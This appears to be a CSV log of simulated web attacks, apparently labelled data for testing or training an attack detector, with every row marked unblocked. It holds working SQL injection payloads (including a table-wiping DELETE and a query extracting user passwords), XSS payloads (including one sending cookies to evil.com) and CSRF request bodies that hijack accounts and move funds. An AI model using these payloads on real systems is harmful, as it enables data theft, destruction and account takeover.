timestamp,attack_type,payload_snippet,label,status_code,blocked
2026-07-01T16:44:31.686911,sqli,admin'--,1,N/A,False
2026-07-01T16:44:32.083903,sqli,' AND 1=1--,1,N/A,False
2026-07-01T16:44:32.473018,sqli,'; DELETE FROM products WHERE 1=1--,1,N/A,False
2026-07-01T16:44:32.849845,sqli,' AND 1=1--,1,N/A,False
2026-07-01T16:44:33.190783,sqli,"1' UNION SELECT username,password,email FROM users--",1,N/A,False
2026-07-01T16:44:33.709628,sqli,' AND 1=1--,1,N/A,False
2026-07-01T16:44:33.957984,sqli,'; WAITFOR DELAY '00:00:05'--,1,N/A,False
2026-07-01T16:44:34.326876,sqli,' AND 1=2--,1,N/A,False
2026-07-01T16:44:34.655462,sqli,' OR '1'='1,1,N/A,False
2026-07-01T16:44:34.828317,sqli,' AND 1=2--,1,N/A,False
2026-07-01T16:44:35.194830,sqli,' OR 1=1--,1,N/A,False
2026-07-01T16:44:35.411027,sqli,1' OR '1'='1' /*,1,N/A,False
2026-07-01T16:44:35.642869,sqli,'; DELETE FROM products WHERE 1=1--,1,N/A,False
2026-07-01T16:44:35.800667,sqli,' AND 1=1--,1,N/A,False
2026-07-01T16:44:35.926469,sqli,' AND 1=1--,1,N/A,False
2026-07-01T16:44:36.049543,benign,normal_request,0,200,False
2026-07-01T16:44:36.760366,benign,normal_request,0,200,False
2026-07-01T16:44:37.010948,benign,normal_request,0,N/A,False
2026-07-01T16:44:37.464321,benign,normal_request,0,N/A,False
2026-07-01T16:44:38.183226,benign,normal_request,0,N/A,False
2026-07-01T16:44:38.880393,benign,normal_request,0,N/A,False
2026-07-01T16:44:39.578005,benign,normal_request,0,N/A,False
2026-07-01T16:44:40.189629,benign,normal_request,0,201,False
2026-07-01T16:44:40.777316,benign,normal_request,0,N/A,False
2026-07-01T16:44:41.110830,benign,normal_request,0,N/A,False
2026-07-01T16:44:41.504865,xss,<iframe src='javascript:alert(1)'>,1,201,False
2026-07-01T16:44:41.665173,xss,<img src=x onerror=alert(1)>,1,201,False
2026-07-01T16:44:42.007286,xss,<body onload=alert(1)>,1,201,False
2026-07-01T16:44:42.315162,xss,<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>,1,201,False
2026-07-01T16:44:42.517686,xss,<script>alert(document.cookie)</script>,1,201,False
2026-07-01T16:44:42.798658,xss,<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>,1,201,False
2026-07-01T16:44:43.030249,xss,<script>alert(document.cookie)</script>,1,201,False
2026-07-01T16:44:43.306234,xss,<img src=x onerror=alert(1)>,1,201,False
2026-07-01T16:44:43.502177,xss,<script>alert(document.cookie)</script>,1,201,False
2026-07-01T16:44:43.821386,xss,<img src=x onerror=alert(1)>,1,201,False
2026-07-01T16:44:44.113381,xss,<scr<script>ipt>alert(1)</scr</script>ipt>,1,201,False
2026-07-01T16:44:44.475644,xss,<script>alert(document.cookie)</script>,1,201,False
2026-07-01T16:44:44.755482,benign,normal_request,0,201,False
2026-07-01T16:44:45.117016,benign,normal_request,0,201,False
2026-07-01T16:44:45.864545,benign,normal_request,0,200,False
2026-07-01T16:44:46.298237,benign,normal_request,0,N/A,False
2026-07-01T16:44:46.632183,benign,normal_request,0,200,False
2026-07-01T16:44:47.079418,benign,normal_request,0,201,False
2026-07-01T16:44:47.736586,benign,normal_request,0,200,False
2026-07-01T16:44:48.473904,benign,normal_request,0,N/A,False
2026-07-01T16:44:49.002774,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,201,False
2026-07-01T16:44:49.489736,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,201,False
2026-07-01T16:44:49.786977,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,201,False
2026-07-01T16:44:50.168855,csrf,"{""action"": ""change_password"", ""new_password"": ""hacked123""}",1,201,False
2026-07-01T16:44:50.598678,csrf,"{""action"": ""delete_user"", ""user_id"": 123}",1,201,False
2026-07-01T16:44:50.913263,csrf,"{""action"": ""change_password"", ""new_password"": ""hacked123""}",1,201,False
2026-07-01T16:44:51.208388,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,201,False
2026-07-01T16:44:51.708336,csrf,"{""action"": ""delete_user"", ""user_id"": 123}",1,201,False
2026-07-01T16:44:52.244329,csrf,"{""action"": ""change_password"", ""new_password"": ""hacked123""}",1,201,False
